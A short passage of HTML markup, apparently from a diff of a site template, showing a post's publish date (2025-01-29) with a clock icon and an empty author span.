+                                <i class="far fa-clock fa-fw icon-date"></i>2025-01-29
                             </span>
                         <span class="publish-author">
                             
